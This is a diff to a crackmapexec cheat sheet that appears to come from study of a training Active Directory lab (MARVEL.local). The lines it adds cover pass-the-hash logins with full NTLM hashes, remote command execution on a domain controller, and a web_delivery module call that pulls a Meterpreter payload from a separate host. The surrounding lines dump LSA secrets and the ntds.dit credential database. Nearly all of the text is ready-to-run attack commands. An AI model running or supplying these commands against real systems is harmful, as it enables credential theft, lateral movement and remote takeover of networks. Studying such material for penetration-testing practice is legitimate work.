@@ -87,6 +87,10 @@ crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth --s
 #enumerate local security authority
 crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth --lsa
 
+#pass the hash of domain user.
+crackmapexec smb 192.168.154.0/24 -u fcastle -H aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b -d MARVEL.local
+
+
 #enumerate users
 crackmapexec smb 192.168.154.134/24 -u Administrator -d MARVEL.local -p P@\$\$w0rd --users
 
@@ -117,11 +121,19 @@ crackmapexec smb 192.168.154.134 -u Administrator -d MARVEL.local -p P@\$\$w0rd 
 #Dump ntds.dit database from domain controller using vss(Volumn shadow copy)
 crackmapexec smb 192.168.154.134 -u Administrator -d MARVEL.local -p P@\$\$w0rd --ntds vss
 
+#execute the commands , execute powershell commands using capital X
+crackmapexec smb 192.168.154.134 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:f56a8399599f1be040128b1dd9623c29 -d MARVEL.local -x 'ipconfig'
+
+
 #Checkout module of particular protocol.
 crackmapexec smb -L
+cme smb -M slinky --options
 
 #using the modules
 crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth -M lsassy
+
+#use web delivery module for meterpreter access.
+crackmapexec smb 192.168.154.134 -u 'Administrator' -p 'P@$$w0rd' -d MARVEL.local -M web_delivery -o URL=http://192.168.154.138:8080/prrpWvUt
 
 
 
